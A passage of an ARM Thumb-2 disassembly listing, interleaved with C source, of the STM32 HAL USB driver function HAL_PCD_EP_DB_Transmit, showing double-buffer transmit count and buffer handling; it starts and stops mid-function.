 8003084:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003088:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800308c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003090:	b29b      	uxth	r3, r3
 8003092:	8013      	strh	r3, [r2, #0]
 8003094:	e2d8      	b.n	8003648 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8003096:	88fb      	ldrh	r3, [r7, #6]
 8003098:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800309c:	2b00      	cmp	r3, #0
 800309e:	d021      	beq.n	80030e4 <HAL_PCD_EP_DB_Transmit+0x22e>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80030a0:	68fb      	ldr	r3, [r7, #12]
 80030a2:	681b      	ldr	r3, [r3, #0]
 80030a4:	461a      	mov	r2, r3
 80030a6:	68bb      	ldr	r3, [r7, #8]
 80030a8:	781b      	ldrb	r3, [r3, #0]
 80030aa:	009b      	lsls	r3, r3, #2
 80030ac:	4413      	add	r3, r2
 80030ae:	881b      	ldrh	r3, [r3, #0]
 80030b0:	b29b      	uxth	r3, r3
 80030b2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80030b6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80030ba:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80030be:	68fb      	ldr	r3, [r7, #12]
 80030c0:	681b      	ldr	r3, [r3, #0]
 80030c2:	461a      	mov	r2, r3
 80030c4:	68bb      	ldr	r3, [r7, #8]
 80030c6:	781b      	ldrb	r3, [r3, #0]
 80030c8:	009b      	lsls	r3, r3, #2
 80030ca:	441a      	add	r2, r3
 80030cc:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80030d0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80030d4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80030d8:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80030dc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80030e0:	b29b      	uxth	r3, r3
 80030e2:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 80030e4:	68bb      	ldr	r3, [r7, #8]
 80030e6:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80030ea:	2b01      	cmp	r3, #1
 80030ec:	f040 82ac 	bne.w	8003648 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 80030f0:	68bb      	ldr	r3, [r7, #8]
 80030f2:	695a      	ldr	r2, [r3, #20]
 80030f4:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80030f8:	441a      	add	r2, r3
 80030fa:	68bb      	ldr	r3, [r7, #8]
 80030fc:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 80030fe:	68bb      	ldr	r3, [r7, #8]
 8003100:	69da      	ldr	r2, [r3, #28]
 8003102:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003106:	441a      	add	r2, r3
 8003108:	68bb      	ldr	r3, [r7, #8]
 800310a:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 800310c:	68bb      	ldr	r3, [r7, #8]
 800310e:	6a1a      	ldr	r2, [r3, #32]
 8003110:	68bb      	ldr	r3, [r7, #8]
 8003112:	691b      	ldr	r3, [r3, #16]
 8003114:	429a      	cmp	r2, r3
 8003116:	d30b      	bcc.n	8003130 <HAL_PCD_EP_DB_Transmit+0x27a>
        {
          len = ep->maxpacket;
 8003118:	68bb      	ldr	r3, [r7, #8]
 800311a:	691b      	ldr	r3, [r3, #16]
 800311c:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 8003120:	68bb      	ldr	r3, [r7, #8]
 8003122:	6a1a      	ldr	r2, [r3, #32]
 8003124:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003128:	1ad2      	subs	r2, r2, r3
 800312a:	68bb      	ldr	r3, [r7, #8]
 800312c:	621a      	str	r2, [r3, #32]
 800312e:	e017      	b.n	8003160 <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else if (ep->xfer_len_db == 0U)
 8003130:	68bb      	ldr	r3, [r7, #8]
 8003132:	6a1b      	ldr	r3, [r3, #32]
 8003134:	2b00      	cmp	r3, #0
 8003136:	d108      	bne.n	800314a <HAL_PCD_EP_DB_Transmit+0x294>
        {
          len = TxPctSize;
 8003138:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800313c:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 8003140:	68bb      	ldr	r3, [r7, #8]
 8003142:	2200      	movs	r2, #0
 8003144:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003148:	e00a      	b.n	8003160 <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else
        {
          ep->xfer_fill_db = 0U;
 800314a:	68bb      	ldr	r3, [r7, #8]
 800314c:	2200      	movs	r2, #0
 800314e:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
          len = ep->xfer_len_db;
 8003152:	68bb      	ldr	r3, [r7, #8]
 8003154:	6a1b      	ldr	r3, [r3, #32]
 8003156:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 800315a:	68bb      	ldr	r3, [r7, #8]
 800315c:	2200      	movs	r2, #0
 800315e:	621a      	str	r2, [r3, #32]
        }

        /* Write remaining Data to Buffer */
        /* Set the Double buffer counter for pma buffer1 */
        PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 8003160:	68bb      	ldr	r3, [r7, #8]
 8003162:	785b      	ldrb	r3, [r3, #1]
 8003164:	2b00      	cmp	r3, #0
 8003166:	d165      	bne.n	8003234 <HAL_PCD_EP_DB_Transmit+0x37e>
 8003168:	68fb      	ldr	r3, [r7, #12]
 800316a:	681b      	ldr	r3, [r3, #0]
 800316c:	63fb      	str	r3, [r7, #60]	; 0x3c
 800316e:	68fb      	ldr	r3, [r7, #12]
 8003170:	681b      	ldr	r3, [r3, #0]
 8003172:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003176:	b29b      	uxth	r3, r3
 8003178:	461a      	mov	r2, r3
 800317a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 800317c:	4413      	add	r3, r2
 800317e:	63fb      	str	r3, [r7, #60]	; 0x3c
 8003180:	68bb      	ldr	r3, [r7, #8]
 8003182:	781b      	ldrb	r3, [r3, #0]
 8003184:	00da      	lsls	r2, r3, #3
 8003186:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8003188:	4413      	add	r3, r2
 800318a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800318e:	63bb      	str	r3, [r7, #56]	; 0x38
 8003190:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003192:	881b      	ldrh	r3, [r3, #0]
 8003194:	b29b      	uxth	r3, r3
 8003196:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800319a:	b29a      	uxth	r2, r3
 800319c:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800319e:	801a      	strh	r2, [r3, #0]
 80031a0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031a4:	2b3e      	cmp	r3, #62	; 0x3e
 80031a6:	d91d      	bls.n	80031e4 <HAL_PCD_EP_DB_Transmit+0x32e>
 80031a8:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031ac:	095b      	lsrs	r3, r3, #5
 80031ae:	64bb      	str	r3, [r7, #72]	; 0x48
 80031b0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031b4:	f003 031f 	and.w	r3, r3, #31
 80031b8:	2b00      	cmp	r3, #0
 80031ba:	d102      	bne.n	80031c2 <HAL_PCD_EP_DB_Transmit+0x30c>
 80031bc:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80031be:	3b01      	subs	r3, #1
 80031c0:	64bb      	str	r3, [r7, #72]	; 0x48
 80031c2:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031c4:	881b      	ldrh	r3, [r3, #0]
 80031c6:	b29a      	uxth	r2, r3
 80031c8:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80031ca:	b29b      	uxth	r3, r3
 80031cc:	029b      	lsls	r3, r3, #10
 80031ce:	b29b      	uxth	r3, r3
 80031d0:	4313      	orrs	r3, r2
 80031d2:	b29b      	uxth	r3, r3
 80031d4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80031d8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80031dc:	b29a      	uxth	r2, r3
 80031de:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031e0:	801a      	strh	r2, [r3, #0]
 80031e2:	e044      	b.n	800326e <HAL_PCD_EP_DB_Transmit+0x3b8>
 80031e4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031e8:	2b00      	cmp	r3, #0
 80031ea:	d10a      	bne.n	8003202 <HAL_PCD_EP_DB_Transmit+0x34c>
 80031ec:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031ee:	881b      	ldrh	r3, [r3, #0]
 80031f0:	b29b      	uxth	r3, r3
 80031f2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80031f6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80031fa:	b29a      	uxth	r2, r3
 80031fc:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031fe:	801a      	strh	r2, [r3, #0]
 8003200:	e035      	b.n	800326e <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003202:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003206:	085b      	lsrs	r3, r3, #1
 8003208:	64bb      	str	r3, [r7, #72]	; 0x48
 800320a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800320e:	f003 0301 	and.w	r3, r3, #1
 8003212:	2b00      	cmp	r3, #0
 8003214:	d002      	beq.n	800321c <HAL_PCD_EP_DB_Transmit+0x366>
 8003216:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003218:	3301      	adds	r3, #1
 800321a:	64bb      	str	r3, [r7, #72]	; 0x48
 800321c:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800321e:	881b      	ldrh	r3, [r3, #0]
 8003220:	b29a      	uxth	r2, r3
 8003222:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003224:	b29b      	uxth	r3, r3
 8003226:	029b      	lsls	r3, r3, #10
 8003228:	b29b      	uxth	r3, r3
 800322a:	4313      	orrs	r3, r2
 800322c:	b29a      	uxth	r2, r3
 800322e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003230:	801a      	strh	r2, [r3, #0]
 8003232:	e01c      	b.n	800326e <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003234:	68bb      	ldr	r3, [r7, #8]
 8003236:	785b      	ldrb	r3, [r3, #1]
 8003238:	2b01      	cmp	r3, #1
 800323a:	d118      	bne.n	800326e <HAL_PCD_EP_DB_Transmit+0x3b8>
 800323c:	68fb      	ldr	r3, [r7, #12]
 800323e:	681b      	ldr	r3, [r3, #0]
 8003240:	647b      	str	r3, [r7, #68]	; 0x44
 8003242:	68fb      	ldr	r3, [r7, #12]
 8003244:	681b      	ldr	r3, [r3, #0]
 8003246:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800324a:	b29b      	uxth	r3, r3
 800324c:	461a      	mov	r2, r3
 800324e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8003250:	4413      	add	r3, r2
 8003252:	647b      	str	r3, [r7, #68]	; 0x44
 8003254:	68bb      	ldr	r3, [r7, #8]
 8003256:	781b      	ldrb	r3, [r3, #0]
 8003258:	00da      	lsls	r2, r3, #3
 800325a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800325c:	4413      	add	r3, r2
 800325e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003262:	643b      	str	r3, [r7, #64]	; 0x40
 8003264:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003268:	b29a      	uxth	r2, r3
 800326a:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 800326c:	801a      	strh	r2, [r3, #0]

        /* Copy user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr0, (uint16_t)len);
 800326e:	68fb      	ldr	r3, [r7, #12]
 8003270:	6818      	ldr	r0, [r3, #0]
 8003272:	68bb      	ldr	r3, [r7, #8]
 8003274:	6959      	ldr	r1, [r3, #20]
 8003276:	68bb      	ldr	r3, [r7, #8]
 8003278:	891a      	ldrh	r2, [r3, #8]
 800327a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800327e:	b29b      	uxth	r3, r3
 8003280:	f005 f8c9 	bl	8008416 <USB_WritePMA>
 8003284:	e1e0      	b.n	8003648 <HAL_PCD_EP_DB_Transmit+0x792>
    }
  }
  else /* Data Buffer1 ACK received */
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8003286:	68fb      	ldr	r3, [r7, #12]
 8003288:	681b      	ldr	r3, [r3, #0]
 800328a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800328e:	b29b      	uxth	r3, r3
 8003290:	461a      	mov	r2, r3
 8003292:	68bb      	ldr	r3, [r7, #8]
 8003294:	781b      	ldrb	r3, [r3, #0]
 8003296:	00db      	lsls	r3, r3, #3
 8003298:	4413      	add	r3, r2
 800329a:	68fa      	ldr	r2, [r7, #12]
 800329c:	6812      	ldr	r2, [r2, #0]
 800329e:	4413      	add	r3, r2
 80032a0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80032a4:	881b      	ldrh	r3, [r3, #0]
 80032a6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80032aa:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len >= TxPctSize)
 80032ae:	68bb      	ldr	r3, [r7, #8]
 80032b0:	699a      	ldr	r2, [r3, #24]
 80032b2:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80032b6:	429a      	cmp	r2, r3
 80032b8:	d307      	bcc.n	80032ca <HAL_PCD_EP_DB_Transmit+0x414>
    {
      ep->xfer_len -= TxPctSize;
 80032ba:	68bb      	ldr	r3, [r7, #8]
 80032bc:	699a      	ldr	r2, [r3, #24]
 80032be:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80032c2:	1ad2      	subs	r2, r2, r3
 80032c4:	68bb      	ldr	r3, [r7, #8]
 80032c6:	619a      	str	r2, [r3, #24]
 80032c8:	e002      	b.n	80032d0 <HAL_PCD_EP_DB_Transmit+0x41a>
    }
    else
    {
      ep->xfer_len = 0U;
 80032ca:	68bb      	ldr	r3, [r7, #8]
 80032cc:	2200      	movs	r2, #0
 80032ce:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 80032d0:	68bb      	ldr	r3, [r7, #8]
 80032d2:	699b      	ldr	r3, [r3, #24]
 80032d4:	2b00      	cmp	r3, #0
 80032d6:	f040 80c0 	bne.w	800345a <HAL_PCD_EP_DB_Transmit+0x5a4>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 80032da:	68bb      	ldr	r3, [r7, #8]
 80032dc:	785b      	ldrb	r3, [r3, #1]
 80032de:	2b00      	cmp	r3, #0
 80032e0:	d126      	bne.n	8003330 <HAL_PCD_EP_DB_Transmit+0x47a>
 80032e2:	68fb      	ldr	r3, [r7, #12]
 80032e4:	681b      	ldr	r3, [r3, #0]
 80032e6:	67fb      	str	r3, [r7, #124]	; 0x7c
 80032e8:	68fb      	ldr	r3, [r7, #12]
 80032ea:	681b      	ldr	r3, [r3, #0]
 80032ec:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80032f0:	b29b      	uxth	r3, r3
 80032f2:	461a      	mov	r2, r3
 80032f4:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80032f6:	4413      	add	r3, r2
 80032f8:	67fb      	str	r3, [r7, #124]	; 0x7c
 80032fa:	68bb      	ldr	r3, [r7, #8]
 80032fc:	781b      	ldrb	r3, [r3, #0]
 80032fe:	00da      	lsls	r2, r3, #3
 8003300:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8003302:	4413      	add	r3, r2
 8003304:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003308:	67bb      	str	r3, [r7, #120]	; 0x78
 800330a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800330c:	881b      	ldrh	r3, [r3, #0]
 800330e:	b29b      	uxth	r3, r3
 8003310:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003314:	b29a      	uxth	r2, r3
 8003316:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003318:	801a      	strh	r2, [r3, #0]
 800331a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800331c:	881b      	ldrh	r3, [r3, #0]
 800331e:	b29b      	uxth	r3, r3
 8003320:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003324:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003328:	b29a      	uxth	r2, r3
 800332a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800332c:	801a      	strh	r2, [r3, #0]
 800332e:	e01a      	b.n	8003366 <HAL_PCD_EP_DB_Transmit+0x4b0>
 8003330:	68bb      	ldr	r3, [r7, #8]
 8003332:	785b      	ldrb	r3, [r3, #1]
 8003334:	2b01      	cmp	r3, #1
 8003336:	d116      	bne.n	8003366 <HAL_PCD_EP_DB_Transmit+0x4b0>
 8003338:	68fb      	ldr	r3, [r7, #12]
 800333a:	681b      	ldr	r3, [r3, #0]
 800333c:	667b      	str	r3, [r7, #100]	; 0x64
 800333e:	68fb      	ldr	r3, [r7, #12]
 8003340:	681b      	ldr	r3, [r3, #0]
 8003342:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003346:	b29b      	uxth	r3, r3
 8003348:	461a      	mov	r2, r3
 800334a:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800334c:	4413      	add	r3, r2
 800334e:	667b      	str	r3, [r7, #100]	; 0x64
 8003350:	68bb      	ldr	r3, [r7, #8]
 8003352:	781b      	ldrb	r3, [r3, #0]
 8003354:	00da      	lsls	r2, r3, #3
 8003356:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8003358:	4413      	add	r3, r2
 800335a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800335e:	663b      	str	r3, [r7, #96]	; 0x60
 8003360:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 8003362:	2200      	movs	r2, #0
 8003364:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003366:	68fb      	ldr	r3, [r7, #12]
 8003368:	681b      	ldr	r3, [r3, #0]
 800336a:	677b      	str	r3, [r7, #116]	; 0x74
 800336c:	68bb      	ldr	r3, [r7, #8]
 800336e:	785b      	ldrb	r3, [r3, #1]
 8003370:	2b00      	cmp	r3, #0
 8003372:	d12b      	bne.n	80033cc <HAL_PCD_EP_DB_Transmit+0x516>
 8003374:	68fb      	ldr	r3, [r7, #12]
 8003376:	681b      	ldr	r3, [r3, #0]
 8003378:	66fb      	str	r3, [r7, #108]	; 0x6c
 800337a:	68fb      	ldr	r3, [r7, #12]
 800337c:	681b      	ldr	r3, [r3, #0]
 800337e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003382:	b29b      	uxth	r3, r3
 8003384:	461a      	mov	r2, r3
 8003386:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003388:	4413      	add	r3, r2
 800338a:	66fb      	str	r3, [r7, #108]	; 0x6c
 800338c:	68bb      	ldr	r3, [r7, #8]
 800338e:	781b      	ldrb	r3, [r3, #0]
 8003390:	00da      	lsls	r2, r3, #3
 8003392:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003394:	4413      	add	r3, r2
 8003396:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800339a:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 800339e:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033a2:	881b      	ldrh	r3, [r3, #0]
 80033a4:	b29b      	uxth	r3, r3
 80033a6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80033aa:	b29a      	uxth	r2, r3
 80033ac:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033b0:	801a      	strh	r2, [r3, #0]
 80033b2:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033b6:	881b      	ldrh	r3, [r3, #0]
 80033b8:	b29b      	uxth	r3, r3
 80033ba:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80033be:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80033c2:	b29a      	uxth	r2, r3
 80033c4:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033c8:	801a      	strh	r2, [r3, #0]
 80033ca:	e017      	b.n	80033fc <HAL_PCD_EP_DB_Transmit+0x546>
 80033cc:	68bb      	ldr	r3, [r7, #8]
 80033ce:	785b      	ldrb	r3, [r3, #1]
 80033d0:	2b01      	cmp	r3, #1
 80033d2:	d113      	bne.n	80033fc <HAL_PCD_EP_DB_Transmit+0x546>
 80033d4:	68fb      	ldr	r3, [r7, #12]
 80033d6:	681b      	ldr	r3, [r3, #0]
 80033d8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80033dc:	b29b      	uxth	r3, r3
 80033de:	461a      	mov	r2, r3
 80033e0:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 80033e2:	4413      	add	r3, r2
 80033e4:	677b      	str	r3, [r7, #116]	; 0x74
 80033e6:	68bb      	ldr	r3, [r7, #8]
 80033e8:	781b      	ldrb	r3, [r3, #0]
 80033ea:	00da      	lsls	r2, r3, #3
 80033ec:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 80033ee:	4413      	add	r3, r2
 80033f0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80033f4:	673b      	str	r3, [r7, #112]	; 0x70
 80033f6:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80033f8:	2200      	movs	r2, #0
 80033fa:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 80033fc:	68bb      	ldr	r3, [r7, #8]
 80033fe:	781b      	ldrb	r3, [r3, #0]
 8003400:	4619      	mov	r1, r3
 8003402:	68f8      	ldr	r0, [r7, #12]
 8003404:	f009 fa69 	bl	800c8da <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 8003408:	88fb      	ldrh	r3, [r7, #6]
 800340a:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800340e:	2b00      	cmp	r3, #0
 8003410:	f040 811a 	bne.w	8003648 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003414:	68fb      	ldr	r3, [r7, #12]
 8003416:	681b      	ldr	r3, [r3, #0]
 8003418:	461a      	mov	r2, r3
 800341a:	68bb      	ldr	r3, [r7, #8]
 800341c:	781b      	ldrb	r3, [r3, #0]
 800341e:	009b      	lsls	r3, r3, #2
 8003420:	4413      	add	r3, r2
 8003422:	881b      	ldrh	r3, [r3, #0]
 8003424:	b29b      	uxth	r3, r3
 8003426:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800342a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800342e:	f8a7 3088 	strh.w	r3, [r7, #136]	; 0x88
 8003432:	68fb      	ldr	r3, [r7, #12]
 8003434:	681b      	ldr	r3, [r3, #0]
 8003436:	461a      	mov	r2, r3
 8003438:	68bb      	ldr	r3, [r7, #8]
 800343a:	781b      	ldrb	r3, [r3, #0]
 800343c:	009b      	lsls	r3, r3, #2
 800343e:	441a      	add	r2, r3
 8003440:	f8b7 3088 	ldrh.w	r3, [r7, #136]	; 0x88
 8003444:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003448:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800344c:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003450:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003454:	b29b      	uxth	r3, r3
 8003456:	8013      	strh	r3, [r2, #0]
 8003458:	e0f6      	b.n	8003648 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 800345a:	88fb      	ldrh	r3, [r7, #6]
 800345c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003460:	2b00      	cmp	r3, #0
 8003462:	d121      	bne.n	80034a8 <HAL_PCD_EP_DB_Transmit+0x5f2>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003464:	68fb      	ldr	r3, [r7, #12]
 8003466:	681b      	ldr	r3, [r3, #0]
 8003468:	461a      	mov	r2, r3
 800346a:	68bb      	ldr	r3, [r7, #8]
 800346c:	781b      	ldrb	r3, [r3, #0]
 800346e:	009b      	lsls	r3, r3, #2
 8003470:	4413      	add	r3, r2
 8003472:	881b      	ldrh	r3, [r3, #0]
 8003474:	b29b      	uxth	r3, r3
 8003476:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800347a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800347e:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 8003482:	68fb      	ldr	r3, [r7, #12]
 8003484:	681b      	ldr	r3, [r3, #0]
 8003486:	461a      	mov	r2, r3
 8003488:	68bb      	ldr	r3, [r7, #8]
 800348a:	781b      	ldrb	r3, [r3, #0]
 800348c:	009b      	lsls	r3, r3, #2
 800348e:	441a      	add	r2, r3
 8003490:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8003494:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003498:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800349c:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80034a0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80034a4:	b29b      	uxth	r3, r3
 80034a6:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 80034a8:	68bb      	ldr	r3, [r7, #8]
 80034aa:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80034ae:	2b01      	cmp	r3, #1
 80034b0:	f040 80ca 	bne.w	8003648 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 80034b4:	68bb      	ldr	r3, [r7, #8]
 80034b6:	695a      	ldr	r2, [r3, #20]
 80034b8:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80034bc:	441a      	add	r2, r3
 80034be:	68bb      	ldr	r3, [r7, #8]
 80034c0:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 80034c2:	68bb      	ldr	r3, [r7, #8]
 80034c4:	69da      	ldr	r2, [r3, #28]
 80034c6:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80034ca:	441a      	add	r2, r3
 80034cc:	68bb      	ldr	r3, [r7, #8]
 80034ce:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 80034d0:	68bb      	ldr	r3, [r7, #8]
 80034d2:	6a1a      	ldr	r2, [r3, #32]
 80034d4:	68bb      	ldr	r3, [r7, #8]
 80034d6:	691b      	ldr	r3, [r3, #16]
 80034d8:	429a      	cmp	r2, r3
 80034da:	d30b      	bcc.n	80034f4 <HAL_PCD_EP_DB_Transmit+0x63e>
        {
          len = ep->maxpacket;
 80034dc:	68bb      	ldr	r3, [r7, #8]
 80034de:	691b      	ldr	r3, [r3, #16]
 80034e0:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 80034e4:	68bb      	ldr	r3, [r7, #8]
 80034e6:	6a1a      	ldr	r2, [r3, #32]
 80034e8:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80034ec:	1ad2      	subs	r2, r2, r3
 80034ee:	68bb      	ldr	r3, [r7, #8]
 80034f0:	621a      	str	r2, [r3, #32]
 80034f2:	e017      	b.n	8003524 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else if (ep->xfer_len_db == 0U)
 80034f4:	68bb      	ldr	r3, [r7, #8]
 80034f6:	6a1b      	ldr	r3, [r3, #32]
 80034f8:	2b00      	cmp	r3, #0
